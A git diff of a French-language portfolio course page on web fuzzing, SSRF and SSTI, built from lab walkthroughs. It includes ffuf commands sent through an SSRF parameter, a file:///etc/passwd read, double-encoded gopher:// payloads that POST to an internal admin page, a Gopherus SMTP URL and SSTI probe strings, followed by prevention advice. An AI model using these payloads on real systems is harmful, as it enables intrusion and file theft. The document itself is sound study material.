@@ -11,14 +11,13 @@
 
 <body>
 <main class="course-container">
-
+  <a href="{% url 'portfolio:web_fuzzing_exploit' %}" class="course-btn">
+    ⚠️ Voir le walkthrough technique
+  </a>
   <a href="{% url 'portfolio:accueil' %}" class="back-link">
     ← Retour au portfolio
   </a>
-
   <h1>🧪 Web Fuzzing</h1>
-
-  <!-- ===== DEFINITION ===== -->
   <section class="course-section">
     <h2>🎯 Définition</h2>
     <p>
@@ -30,9 +29,7 @@
         à l'inverse les attaques coré serveur ciblent le serveur web.
     </p>
   </section>
-
-
-<section class="course-section">
+  <section class="course-section">
   <h2>🎯 Les différents types de failles côté serveur</h2>
 
   <ul>
@@ -43,9 +40,7 @@
   </ul>
 
 </section>
-
-
-<section class="course-section">
+  <section class="course-section">
   <h3>Server-Side Request Forgery (SSRF)</h3>
   <p>
     La <strong>Server-Side Request Forgery (SSRF)</strong> est une vulnérabilité qui permet à un attaquant
@@ -57,8 +52,7 @@
     de contourner des pare-feux ou encore de récupérer des informations sensibles.
   </p>
 </section>
-
-<section class="course-section">
+  <section class="course-section">
   <h3>Server-Side Template Injection (SSTI)</h3>
   <p>
     Les applications web utilisent souvent des moteurs de templates et des modèles côté serveur
@@ -73,7 +67,7 @@
     l’exécution de code à distance.
   </p>
 </section>
-<section class="course-section">
+  <section class="course-section">
   <h3>XSLT Server-Side Injection</h3>
   <p>
     La <strong>XSLT Server-Side Injection</strong> est une vulnérabilité qui apparaît lorsqu’un attaquant
@@ -88,56 +82,419 @@
     compromission complète du système.
   </p>
 </section>
+  <section class="tools-section">
 
-<h2>Introduction à la SSRF</h2>
-<p>
-  Les vulnérabilités de type <strong>Server-Side Request Forgery (SSRF)</strong> font partie du
-  <strong>Top 10 de l’OWASP</strong>. Ce type de vulnérabilité apparaît lorsqu’une application web
-  récupère des ressources distantes en se basant sur des données fournies par l’utilisateur,
-  comme une URL.
-</p>
+  <h2>Introduction à la SSRF</h2>
 
-<h3>Server-Side Request Forgery</h3>
-<p>
-  Lorsqu’un serveur web récupère des ressources distantes en fonction d’une entrée utilisateur,
-  un attaquant peut potentiellement forcer le serveur à effectuer des requêtes vers des URL arbitraires
-  qu’il contrôle. Dans ce cas, le serveur est vulnérable à une SSRF.
-  <br><br>
-  Même si cela peut sembler anodin au premier abord, selon la configuration de l’application web,
-  une SSRF peut avoir des conséquences dévastatrices, comme nous le verrons dans les sections suivantes.
-</p>
+  <p>
+    Les vulnérabilités de type <strong>Server-Side Request Forgery (SSRF)</strong> font partie du
+    <strong>Top 10 de l’OWASP</strong>. Ce type de vulnérabilité apparaît lorsqu’une application web
+    récupère des ressources distantes en se basant sur des données fournies par l’utilisateur,
+    comme une URL.
+  </p>
 
-<p>
-  De plus, si l’application web repose sur un schéma ou un protocole d’URL fourni par l’utilisateur,
-  un attaquant peut provoquer des comportements encore plus dangereux en manipulant ce schéma.
-  Voici quelques exemples de schémas d’URL couramment utilisés dans l’exploitation des vulnérabilités SSRF :
-</p>
+  <h3>Server-Side Request Forgery</h3>
 
-<ul>
-  <li>
-    <strong>http:// et https://</strong> : Ces schémas permettent de récupérer du contenu via des requêtes HTTP/S.
-    Un attaquant peut les utiliser pour contourner des WAF, accéder à des endpoints restreints ou
-    atteindre des services internes.
-  </li>
+  <p>
+    Lorsqu’un serveur web récupère des ressources distantes en fonction d’une entrée utilisateur,
+    un attaquant peut potentiellement forcer le serveur à effectuer des requêtes vers des URL arbitraires
+    qu’il contrôle. Dans ce cas, le serveur est vulnérable à une SSRF.
+    <br><br>
+    Même si cela peut sembler anodin au premier abord, selon la configuration de l’application web,
+    une SSRF peut avoir des conséquences dévastatrices, comme nous le verrons dans les sections suivantes.
+  </p>
 
-  <li>
-    <strong>file://</strong> : Ce schéma permet de lire un fichier présent sur le système local.
-    Un attaquant peut l’exploiter pour lire des fichiers locaux sur le serveur (LFI).
-  </li>
+  <p>
+    De plus, si l’application web repose sur un schéma ou un protocole d’URL fourni par l’utilisateur,
+    un attaquant peut provoquer des comportements encore plus dangereux en manipulant ce schéma.
+    Voici quelques exemples de schémas d’URL couramment utilisés dans l’exploitation des vulnérabilités SSRF :
+  </p>
 
-  <li>
-    <strong>gopher://</strong> : Ce protocole permet d’envoyer des octets arbitraires à une adresse donnée.
-    Un attaquant peut l’utiliser pour envoyer des requêtes HTTP POST avec un payload personnalisé ou
-    communiquer avec d’autres services, comme des serveurs SMTP ou des bases de données.
-  </li>
-</ul>
+  <ul>
+    <li>
+      <strong>http:// et https://</strong> : Ces schémas permettent de récupérer du contenu via des requêtes HTTP/S.
+      Un attaquant peut les utiliser pour contourner des WAF, accéder à des endpoints restreints ou
+      atteindre des services internes.
+    </li>
 
-<p>
-  Pour plus de détails sur les techniques avancées d’exploitation SSRF, comme les contournements de filtres
-  ou le DNS rebinding, consultez le module <em>Modern Web Exploitation Techniques</em>.
-</p>
+    <li>
+      <strong>file://</strong> : Ce schéma permet de lire un fichier présent sur le système local.
+      Un attaquant peut l’exploiter pour lire des fichiers locaux sur le serveur (LFI).
+    </li>
 
-  <!-- ===== CONCEPTS ===== -->
+    <li>
+      <strong>gopher://</strong> : Ce protocole permet d’envoyer des octets arbitraires à une adresse donnée.
+      Un attaquant peut l’utiliser pour envoyer des requêtes HTTP POST avec un payload personnalisé ou
+      communiquer avec d’autres services, comme des serveurs SMTP ou des bases de données.
+    </li>
+  </ul>
+
+  <p>
+    Pour plus de détails sur les techniques avancées d’exploitation SSRF, comme les contournements de filtres
+    ou le DNS rebinding, consultez le module <em>Modern Web Exploitation Techniques</em>.
+  </p>
+
+</section>
+  <section class="tools-section">
+
+  <h2>Exploitation des Vulnérabilités SSRF</h2>
+
+  <p>
+    L’exploitation des vulnérabilités SSRF permet d’aller au‑delà de la simple énumération du serveur web
+    et d’augmenter considérablement l’impact de ces failles.
+  </p>
+
+  <h3>1. Accéder aux Endpoints Restreints</h3>
+
+  <p>
+    <strong>Problème :</strong> L’application web récupère des informations de disponibilité depuis
+    <em>dateserver.htb</em>, mais l’accès direct est interdit.
+    <br><br>
+    <strong>Solution :</strong> Utiliser la vulnérabilité SSRF pour énumérer des endpoints supplémentaires.
+    <br><br>
+    <strong>Outil utilisé :</strong> <code>ffuf</code> pour un brute‑force de répertoires.
+  </p>
+
+  <pre><code>ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt \
+-u http://172.17.0.2/index.php -X POST \
+-H "Content-Type: application/x-www-form-urlencoded" \
+-d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" \
+-fr "Server at dateserver.htb Port 80"
+</code></pre>
+
+  <h4>Accès à l’endpoint</h4>
+  <p>
+    L’URL <code>http://dateserver.htb/admin.php</code> peut être envoyée via le paramètre
+    <code>dateserver</code> pour tenter d’accéder à des informations sensibles.
+  </p>
+
+  <h3>2. Inclusion Locale de Fichiers (LFI)</h3>
+
+  <p>
+    <strong>Technique :</strong> Manipuler le schéma d’URL pour lire des fichiers locaux.
+    <br>
+    <strong>Exemple :</strong> Utiliser le schéma <code>file://</code> pour lire <code>/etc/passwd</code>.
+  </p>
+
+  <pre><code>file:///etc/passwd</code></pre>
+
+  <p>
+    <strong>Impact :</strong> Permet de lire des fichiers arbitraires, y compris le code source de l’application web.
+  </p>
+
+  <h3>3. Le Protocole Gopher</h3>
+
+  <p>
+    <strong>Problème :</strong> Le schéma <code>http://</code> est limité aux requêtes GET et ne permet pas
+    d’envoyer des requêtes POST nécessaires pour certains endpoints.
+    <br><br>
+    <strong>Solution :</strong> Utiliser le schéma <code>gopher://</code> pour envoyer des octets arbitraires
+    à un socket TCP, permettant de construire manuellement des requêtes POST.
+  </p>
+
+  <p><strong>Construction d’une requête POST :</strong></p>
+
+  <pre><code>gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
+</code></pre>
+
+  <p><strong>Envoi via SSRF (double encodage) :</strong></p>
+
+  <pre><code>POST /index.php HTTP/1.1
+Host: 172.17.0.2
+Content-Length: 265
+Content-Type: application/x-www-form-urlencoded
+</code></pre>
+
+  <pre><code>dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
+</code></pre>
+
+  <h3>4. Utilisation de Gopherus pour Générer des URLs Gopher</h3>
+
+  <p>
+    <strong>Problème :</strong> Construire manuellement des URLs Gopher est complexe.
+    <br><br>
+    <strong>Solution :</strong> Utiliser <strong>Gopherus</strong> pour générer automatiquement des URLs Gopher
+    pour divers services (MySQL, PostgreSQL, Redis, SMTP, etc.).
+    <br><br>
+    <strong>Prérequis :</strong> Python 2.
+  </p>
+
+  <pre><code>python2.7 gopherus.py --exploit smtp</code></pre>
+
+  <p><strong>Exemple d’URL Gopher générée :</strong></p>
+
+  <pre><code>gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40academy.htb%0ARCPT%20To:victim%40academy.htb%0ADATA%0AFrom:attacker%40academy.htb%0ASubject:HelloWorld%0AMessage:Hello%20from%20SSRF!%0A.
+</code></pre>
+
+</section>
+  <section class="tools-section">
+
+  <h2>Exploiting SSRF</h2>
+
+  <p>
+    Après avoir vu comment identifier une vulnérabilité SSRF et l’utiliser pour énumérer un serveur web,
+    explorons maintenant des techniques d’exploitation avancées permettant d’augmenter l’impact de ces failles.
+  </p>
+
+  <h3>1. Accéder aux Endpoints Restreints</h3>
+
+  <p>
+    L’application web récupère des informations de disponibilité depuis <em>dateserver.htb</em>.
+    Cependant, même en ajoutant ce domaine dans le fichier hosts, l’accès direct est refusé :
+  </p>
+
+  <pre><code>http://dateserver.htb:&lt;PORT&gt;/
+Forbidden: You don't have permission to access this resource.
+Apache server at dateserver.htb.
+</code></pre>
+
+  <p>
+    Grâce à la SSRF, nous pouvons tout de même accéder et énumérer le domaine.
+    Par exemple, nous pouvons effectuer un brute‑force de répertoires avec <code>ffuf</code>.
+  </p>
+
+  <p><strong>Commande utilisée :</strong></p>
+
+  <pre><code>ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt \
+-u http://172.17.0.2/index.php -X POST \
+-H "Content-Type: application/x-www-form-urlencoded" \
+-d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" \
+-fr "Server at dateserver.htb Port 80"
+</code></pre>
+
+  <p><strong>Résultats :</strong></p>
+
+  <pre><code>[Status: 200] FUZZ: admin
+[Status: 200] FUZZ: availability
+</code></pre>
+
+  <p>
+    Nous avons identifié un endpoint interne supplémentaire :
+    <code>http://dateserver.htb/admin.php</code>, accessible via la SSRF.
+  </p>
+
+  <h3>2. Local File Inclusion (LFI)</h3>
+
+  <p>
+    En manipulant le schéma d’URL, nous pouvons provoquer des comportements inattendus.
+    Par exemple, en utilisant le schéma <code>file://</code>, nous pouvons lire des fichiers locaux.
+  </p>
+
+  <pre><code>file:///etc/passwd</code></pre>
+
+  <p>
+    Cela permet de lire des fichiers arbitraires, y compris le code source de l’application web.
+  </p>
+
+  <h3>3. Le Protocole Gopher</h3>
+
+  <p>
+    La SSRF via <code>http://</code> est limitée aux requêtes GET.
+    Impossible donc d’envoyer une requête POST pour un formulaire de connexion interne.
+  </p>
+
+  <p>
+    Le schéma <code>gopher://</code> permet d’envoyer des octets arbitraires à un socket TCP,
+    ce qui nous permet de construire manuellement une requête POST.
+  </p>
+
+  <p><strong>Requête POST à envoyer :</strong></p>
+
+  <pre><code>POST /admin.php HTTP/1.1
+Host: dateserver.htb
+Content-Length: 13
+Content-Type: application/x-www-form-urlencoded
+
+adminpw=admin
+</code></pre>
+
+  <p><strong>Encodage en URL Gopher :</strong></p>
+
+  <pre><code>gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
+</code></pre>
+
+  <p>
+    Comme l’URL est envoyée dans un paramètre POST, elle doit être encodée une seconde fois :
+  </p>
+
+  <pre><code>POST /index.php HTTP/1.1
+Host: 172.17.0.2
+Content-Length: 265
+Content-Type: application/x-www-form-urlencoded
+
+dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
+</code></pre>
+
+  <p>
+    Le serveur interne accepte alors notre requête POST et nous donne accès au tableau de bord admin.
+  </p>
+
+  <h3>4. Utilisation de Gopherus pour Générer des URLs Gopher</h3>
+
+  <p>
+    Construire manuellement des URLs Gopher est complexe.
+    L’outil <strong>Gopherus</strong> permet de générer automatiquement des URLs valides pour :
+  </p>
+
+  <ul>
+    <li>MySQL</li>
+    <li>PostgreSQL</li>
+    <li>FastCGI</li>
+    <li>Redis</li>
+    <li>SMTP</li>
+    <li>Zabbix</li>
+    <li>pymemcache / rbmemcache / phpmemcache / dmpmemcache</li>
+  </ul>
+
+  <p><strong>Exécution :</strong></p>
+
+  <pre><code>python2.7 gopherus.py --exploit smtp</code></pre>
+
+  <p><strong>Exemple d’URL Gopher SMTP générée :</strong></p>
+
+  <pre><code>gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40academy.htb%0ARCPT%20To:victim%40academy.htb%0ADATA%0AFrom:attacker%40academy.htb%0ASubject:HelloWorld%0AMessage:Hello%20from%20SSRF%21%0A.
+</code></pre>
+
+</section>
+  <section class="tools-section">
+
+  <h2>Blind SSRF</h2>
+
+  <p>
+    Dans de nombreux cas réels, les vulnérabilités SSRF sont <strong>blind</strong> :
+    la réponse de la requête effectuée par le serveur n’est pas directement affichée à l’attaquant.
+    On parle alors de <strong>Blind SSRF</strong>, car il est impossible de voir la réponse.
+    Les vecteurs d’exploitation sont donc beaucoup plus limités, et l’impact est généralement plus faible
+    que pour une SSRF classique.
+  </p>
+
+  <h3>Identifier une Blind SSRF</h3>
+
+  <p>
+    L’application se comporte comme précédemment : elle récupère une URL fournie par l’utilisateur.
+    On peut confirmer la SSRF en pointant vers un système que l’on contrôle et en écoutant avec <code>nc</code> :
+  </p>
+
+  <pre><code>nc -lnvp 8000
+
+listening on [any] 8000 ...
+connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 32928
+GET /index.php HTTP/1.1
+Host: 172.17.0.1:8000
+Accept: */*
+</code></pre>
+
+  <p>
+    En revanche, lorsqu’on pointe l’application vers elle‑même, la réponse ne contient pas le HTML de la requête forcée,
+    mais un simple message indiquant que la date est indisponible.
+    Cela indique une <strong>Blind SSRF</strong>.
+  </p>
+
+  <h3>Exploiter une Blind SSRF</h3>
+
+  <p>
+    L’exploitation est beaucoup plus limitée que pour une SSRF classique, mais il est parfois possible de :
+  </p>
+
+  <ul>
+    <li>réaliser un <strong>scan de ports local</strong> (si le message d’erreur diffère entre port ouvert/fermé),</li>
+    <li>énumérer des <strong>fichiers existants</strong> sur le système (si le message diffère entre fichier présent/absent).</li>
+  </ul>
+
+  <p>
+    Par exemple, si l’application renvoie <code>Something went wrong!</code> pour un port fermé,
+    mais un autre message (par ex. <code>Date is unavailable</code>) pour un port ouvert répondant en HTTP,
+    on peut en déduire quels ports sont ouverts.
+  </p>
+
+  <p>
+    De même, même si l’on ne peut pas lire le contenu d’un fichier local, on peut parfois distinguer
+    un fichier existant d’un fichier inexistant en observant la différence de message d’erreur.
+  </p>
+
+  <p>
+    Ainsi, même sans exfiltrer directement des données, une Blind SSRF permet encore :
+  </p>
+
+  <ul>
+    <li>d’énumérer des ports ouverts sur le réseau interne,</li>
+    <li>d’identifier des fichiers présents sur le système,</li>
+    <li>de mieux comprendre l’architecture interne pour préparer d’autres attaques.</li>
+  </ul>
+
+  <p>
+    Enfin, même si l’application renvoie le même message pour ports ouverts et fermés,
+    il reste parfois possible d’interagir à l’aveugle avec des services internes
+    en testant des payloads courants sur des applications web internes.
+  </p>
+
+</section>
+  <section class="tools-section">
+
+  <h2>Preventing SSRF</h2>
+
+  <p>
+    Après avoir étudié l’identification et l’exploitation des vulnérabilités SSRF,
+    il est essentiel de comprendre comment les prévenir.
+    Les mesures de mitigation peuvent être appliquées à la fois au niveau de l’application web
+    et au niveau du réseau.
+  </p>
+
+  <h3>1. Prévention au Niveau Applicatif</h3>
+
+  <p>
+    Lorsqu’une application récupère des données depuis un hôte distant en fonction d’une entrée utilisateur,
+    des mesures de sécurité strictes doivent être mises en place pour éviter les scénarios SSRF.
+  </p>
+
+  <ul>
+    <li>
+      <strong>Utilisation d’une whitelist d’origines autorisées :</strong><br>
+      L’application doit vérifier que l’URL fournie appartient à une liste d’hôtes approuvés.
+      Cela empêche un attaquant de forcer le serveur à contacter des systèmes internes ou arbitraires.
+    </li>
+
+    <li>
+      <strong>Restriction du schéma/protocole :</strong><br>
+      Le schéma d’URL (ex. <code>http://</code>, <code>https://</code>) doit être strictement contrôlé.
+      Les protocoles dangereux comme <code>file://</code> ou <code>gopher://</code> doivent être interdits.
+      Idéalement, le protocole doit être <em>hardcodé</em> ou validé via une whitelist.
+    </li>
+
+    <li>
+      <strong>Sanitisation des entrées :</strong><br>
+      Comme pour toute donnée utilisateur, une validation stricte permet d’éviter des comportements inattendus
+      pouvant mener à une SSRF.
+    </li>
+  </ul>
+
+  <h3>2. Prévention au Niveau Réseau</h3>
+
+  <p>
+    Même si l’application présente une vulnérabilité SSRF, une configuration réseau restrictive
+    peut empêcher son exploitation.
+  </p>
+
+  <ul>
+    <li>
+      <strong>Règles de pare-feu restrictives :</strong><br>
+      Le serveur ne doit pouvoir effectuer des requêtes sortantes qu’envers des hôtes explicitement autorisés.
+      Toute requête vers des systèmes internes sensibles doit être bloquée.
+    </li>
+
+    <li>
+      <strong>Ségrégation réseau :</strong><br>
+      Une segmentation appropriée empêche un attaquant d’utiliser une SSRF pour atteindre des systèmes internes
+      critiques ou non exposés.
+    </li>
+  </ul>
+
+  <p>
+    Pour plus de détails sur les mesures de mitigation SSRF, consultez le
+    <em>OWASP SSRF Prevention Cheat Sheet</em>.
+  </p>
+
+</section>
   <section class="course-section">
     <h2>🧠 Concepts essentiels</h2>
 
@@ -173,8 +530,6 @@
       </tbody>
     </table>
   </section>
-
-  <!-- ===== OUTILS ===== -->
   <section class="course-section">
     <h2>🛠️ Outils principaux</h2>
 
@@ -193,8 +548,6 @@ sudo apt install golang python3 python3-pip pipx
 go install github.com/ffuf/ffuf/v2@latest
 go install github.com/OJ/gobuster/v3@latest</code></pre>
   </section>
-
-  <!-- ===== DIRECTORY FUZZING ===== -->
   <section class="course-section">
     <h2>📂 Directory Fuzzing</h2>
 
@@ -212,8 +565,6 @@ go install github.com/OJ/gobuster/v3@latest</code></pre>
       🔎 Le mot-clé <code>FUZZ</code> est remplacé par chaque entrée de la wordlist.
     </p>
   </section>
-
-  <!-- ===== FILE FUZZING ===== -->
   <section class="course-section">
     <h2>📄 File Fuzzing</h2>
 
@@ -232,462 +583,872 @@ go install github.com/OJ/gobuster/v3@latest</code></pre>
       <code>config.php.bak</code> → fuite de credentials
     </p>
   </section>
+  <section class="tools-section">
+
+  <h2>Template Engines</h2>
+
+  <p>
+    Un moteur de template (<em>template engine</em>) est un logiciel qui combine des modèles prédéfinis
+    avec des données dynamiques afin de générer des réponses dynamiques.
+    Les applications web les utilisent fréquemment pour afficher des pages partageant des éléments communs
+    (comme un header ou un footer) tout en insérant du contenu variable.
+    Cela évite la duplication de code et améliore la maintenabilité.
+    Parmi les moteurs de template populaires, on retrouve <strong>Jinja</strong> et <strong>Twig</strong>.
+  </p>
+
+  <h3>Templating</h3>
+
+  <p>
+    Les moteurs de template nécessitent généralement deux éléments :
+  </p>
+
+  <ul>
+    <li><strong>Un template</strong> — une chaîne ou un fichier contenant des emplacements réservés.</li>
+    <li><strong>Des valeurs dynamiques</strong> — fournies sous forme de paires clé‑valeur.</li>
+  </ul>
+
+  <p>
+    Le moteur remplace ensuite les variables du template par les valeurs fournies.
+    Ce processus est appelé <strong>rendering</strong>.
+  </p>
+
+  <p>
+    La syntaxe dépend du moteur utilisé.
+    Pour les exemples suivants, nous utiliserons la syntaxe du moteur <strong>Jinja</strong>.
+  </p>
+
+  <h4>Exemple simple</h4>
+
+  <pre><code>Hello {{ name }}!</code></pre>
+
+  <p>
+    Si nous rendons ce template avec <code>name="vautia"</code>, le résultat sera :
+  </p>
+
+  <pre><code>Hello vautia!</code></pre>
+
+  <h4>Exemple avec boucle</h4>
+
+  <pre><code>{% for name in names %}
+Hello {{ name }}!
+{% endfor %}</code></pre>
+
+  <p>
+    Si nous fournissons la liste <code>names=["vautia", "21y4d", "Pedant"]</code>, le moteur génère :
+  </p>
+
+  <pre><code>Hello vautia!
+Hello 21y4d!
+Hello Pedant!</code></pre>
+
+  <p>
+    Les moteurs de template modernes supportent également des fonctionnalités avancées
+    comme les conditions, les boucles, les filtres, et parfois même des opérations proches
+    de celles d’un langage de programmation.
+  </p>
+
+</section>
+  <section class="tools-section">
+
+  <h2>Introduction to SSTI</h2>
+
+  <p>
+    Comme son nom l’indique, une <strong>Server‑Side Template Injection (SSTI)</strong> survient lorsqu’un attaquant
+    parvient à injecter du code de template dans un modèle qui sera ensuite rendu par le serveur.
+    Si du code malveillant est injecté, le serveur peut l’exécuter lors du rendu, permettant à l’attaquant
+    de prendre un contrôle total du serveur.
+  </p>
+
+  <h3>Server‑Side Template Injection</h3>
+
+  <p>
+    Comme nous l’avons vu dans la section précédente, le rendu d’un template implique l’insertion de valeurs
+    dynamiques dans un modèle. Souvent, ces valeurs proviennent de l’utilisateur.
+    Cependant, tant que ces valeurs sont fournies <strong>comme données</strong> au moteur de template,
+    elles ne sont jamais exécutées : elles sont simplement insérées dans le modèle.
+  </p>
+
+  <p>
+    En revanche, une SSTI apparaît lorsqu’un attaquant peut contrôler <strong>le template lui‑même</strong>.
+    Les moteurs de template exécutent le code présent dans le modèle, ce qui signifie que toute injection
+    dans le template peut conduire à l’exécution de code arbitraire.
+  </p>
+
+  <p>
+    Si le templating est correctement implémenté, l’entrée utilisateur est toujours fournie comme valeur
+    au moteur de rendu, et jamais insérée dans la chaîne du template.
+    Cependant, plusieurs scénarios peuvent introduire une SSTI :
+  </p>
+
+  <ul>
+    <li>
+      <strong>Insertion de données utilisateur dans le template avant le rendu :</strong><br>
+      Si l’application concatène des données utilisateur dans le modèle avant de l’envoyer au moteur de rendu,
+      l’utilisateur contrôle alors une partie du template.
+    </li>
+
+    <li>
+      <strong>Double rendu d’un même template :</strong><br>
+      Si une application rend un template une première fois, puis insère l’output dans un second rendu,
+      toute donnée utilisateur présente dans le premier rendu devient du code de template dans le second.
+    </li>
+
+    <li>
+      <strong>Modification directe de templates par l’utilisateur :</strong><br>
+      Si l’application permet d’éditer ou de soumettre des templates, l’attaquant peut injecter du code
+      directement dans le modèle.
+    </li>
+  </ul>
+
+  <p>
+    Dans tous ces cas, l’attaquant peut exploiter la logique interne du moteur de template pour exécuter
+    du code arbitraire, accéder à des variables internes, lire des fichiers, ou même exécuter des commandes
+    système selon les capacités du moteur.
+  </p>
+
+</section>
+  <section class="tools-section">
+
+  <h2>Identifying SSTI</h2>
+
+  <p>
+    Avant d’exploiter une vulnérabilité de <strong>Server‑Side Template Injection (SSTI)</strong>,
+    il est essentiel de confirmer qu’elle existe réellement et d’identifier le moteur de template utilisé.
+    L’exploitation dépend fortement du moteur (Jinja, Twig, etc.), car chacun possède sa propre syntaxe
+    et ses propres fonctions.
+  </p>
+
+  <h3>Confirming SSTI</h3>
+
+  <p>
+    L’identification d’une SSTI est similaire à celle d’autres injections (comme SQLi) :
+    on injecte des caractères spéciaux ayant une signification particulière pour les moteurs de template
+    et on observe le comportement de l’application.
+  </p>
+
+  <p>
+    Un test classique consiste à injecter la chaîne suivante, qui contient de nombreux caractères spéciaux
+    utilisés par les moteurs de template :
+  </p>
+
+  <pre><code>${{&lt;%[%'"}}%\.</code></pre>
+
+  <p>
+    Cette chaîne devrait presque toujours violer la syntaxe du template et provoquer une erreur
+    si l’application est vulnérable à la SSTI, de la même manière qu’un simple <code>'</code>
+    peut casser une requête SQL vulnérable.
+  </p>
+
+  <p>
+    Exemple : sur une application avec un champ <em>name</em> reflété dans la page suivante,
+    l’injection de cette chaîne peut produire une erreur <em>Internal Server Error</em>,
+    ce qui augmente fortement la suspicion d’une SSTI sur ce paramètre.
+  </p>
+
+  <h3>Identifying the Template Engine</h3>
+
+  <p>
+    Pour exploiter correctement une SSTI, il faut ensuite déterminer le moteur de template utilisé.
+    On peut s’appuyer sur de légères différences de comportement entre les moteurs.
+  </p>
+
+  <p>
+    Une approche courante consiste à injecter successivement plusieurs payloads simples et à observer le résultat.
+    Par exemple, on commence par :
+  </p>
+
+  <pre><code>${7*7}</code></pre>
+
+  <p>
+    Si ce payload est exécuté, on suit une branche (par exemple, résultat <code>49</code>), sinon on teste un autre payload :
+  </p>
+
+  <pre><code>{{7*7}}</code></pre>
+
+  <p>
+    Si cette fois le résultat affiché est <code>49</code>, on sait que le moteur exécute cette syntaxe.
+    On peut alors raffiner avec un payload comme :
+  </p>
+
+  <pre><code>{{7*'7'}}</code></pre>
+
+  <p>
+    Selon le moteur, le résultat diffère :
+    <strong>Jinja</strong> renverra <code>7777777</code>, tandis que <strong>Twig</strong> renverra <code>49</code>.
+    Ces différences permettent de déduire précisément le moteur de template en place.
+  </p>
+
+</section>
+  <section class="tools-section">
+
+  <h2>Exploiting SSTI – Jinja2</h2>
 
-  <!-- ===== WORDLISTS ===== -->
-  <section class="course-section">
-    <h2>📚 Wordlists (très important)</h2>
-
-    <p>
-      Les wordlists sont la base du fuzzing.
-    </p>
-
-    <ul>
-      <li>common.txt → rapide</li>
-      <li>directory-list-2.3-medium.txt → standard</li>
-      <li>big.txt → très complet</li>
-    </ul>
-
-    <pre><code>/usr/share/seclists/Discovery/Web-Content/</code></pre>
-  </section>
-
-  <!-- ===== METHODO ===== -->
-  <section class="course-section">
-    <h2>🧠 Méthodologie (mon workflow)</h2>
-
-    <ol>
-      <li>Recon → analyser le site</li>
-      <li>Directory fuzzing</li>
-      <li>File fuzzing</li>
-      <li>Analyse des réponses</li>
-      <li>Pivot vers exploitation</li>
-    </ol>
-
-    <p>
-      💡 Toujours regarder :
-    </p>
-
-    <ul>
-      <li>Status code (200, 403, 500)</li>
-      <li>Taille réponse</li>
-      <li>Différences comportementales</li>
-    </ul>
-  </section>
-    <!-- ===== RECURSIVE FUZZING ===== -->
-  <section class="course-section">
-    <h2>🌳 Recursive Fuzzing</h2>
-
-    <p>
-      Jusqu’ici, on a fuzz uniquement un niveau (root ou dossier).
-      Mais les applications web peuvent avoir une structure profonde avec plusieurs dossiers imbriqués.
-    </p>
-
-    <p>
-      Le <strong>recursive fuzzing</strong> permet d’automatiser l’exploration complète.
-    </p>
-
-    <h3>⚙️ Fonctionnement</h3>
-
-    <ol>
-      <li>Fuzz du répertoire principal</li>
-      <li>Détection des dossiers valides</li>
-      <li>Relance automatique du fuzz dans chaque dossier</li>
-    </ol>
-
-    <p>
-      📌 Exemple :
-    </p>
-
-    <pre><code>ffuf -w directory-list-2.3-medium.txt \
--u http://TARGET/FUZZ \
--e .html \
--recursion</code></pre>
-
-    <p>
-      🧠 Avantages :
-    </p>
-
-    <ul>
-      <li>Gain de temps énorme</li>
-      <li>Découverte de structures profondes</li>
-      <li>Moins d'effort manuel</li>
-    </ul>
-
-    <p>
-      ⚠️ Options utiles :
-    </p>
-
-    <pre><code>-recursion-depth 2
--rate 500
--timeout 10</code></pre>
-  </section>
-
-  <!-- ===== PARAMETER FUZZING ===== -->
-  <section class="course-section">
-    <h2>🧩 Parameter & Value Fuzzing</h2>
-
-    <p>
-      Ici on ne fuzz plus des dossiers mais des <strong>paramètres</strong>.
-    </p>
-
-    <h3>GET parameters</h3>
-
-    <pre><code>http://site.com/page?x=FUZZ</code></pre>
-
-    <p>
-      Exemple avec wenum :
-    </p>
-
-    <pre><code>wenum -w common.txt \
--u "http://TARGET/get.php?x=FUZZ" \
---hc 404</code></pre>
-
-    <h3>POST parameters</h3>
-
-    <pre><code>ffuf -u http://TARGET/post.php \
--X POST \
--H "Content-Type: application/x-www-form-urlencoded" \
--d "y=FUZZ" \
--w common.txt \
--mc 200</code></pre>
-
-    <p>
-      🎯 Objectif :
-    </p>
-
-    <ul>
-      <li>Trouver des valeurs valides</li>
-      <li>Contourner des contrôles</li>
-      <li>Déclencher des comportements cachés</li>
-    </ul>
-  </section>
-
-  <!-- ===== VHOST & SUBDOMAIN ===== -->
-  <section class="course-section">
-    <h2>🌐 VHost & Subdomain Fuzzing</h2>
-
-    <p>
-      Permet de découvrir des sites cachés sur un même serveur.
-    </p>
-
-    <h3>VHost (Gobuster)</h3>
-
-    <pre><code>gobuster vhost \
--u http://target \
--w common.txt \
---append-domain</code></pre>
-
-    <h3>Subdomain</h3>
-
-    <pre><code>gobuster dns \
--d example.com \
--w subdomains.txt</code></pre>
-
-    <p>
-      🎯 Exemple :
-    </p>
-
-    <ul>
-      <li>admin.example.com</li>
-      <li>dev.example.com</li>
-      <li>test.example.com</li>
-    </ul>
-  </section>
-
-  <!-- ===== FILTERING ===== -->
-  <section class="course-section">
-    <h2>🎯 Filtering (très important)</h2>
-
-    <p>
-      Le fuzzing génère beaucoup de bruit.
-      Il faut filtrer pour voir l’essentiel.
-    </p>
-
-    <h3>FFUF</h3>
-
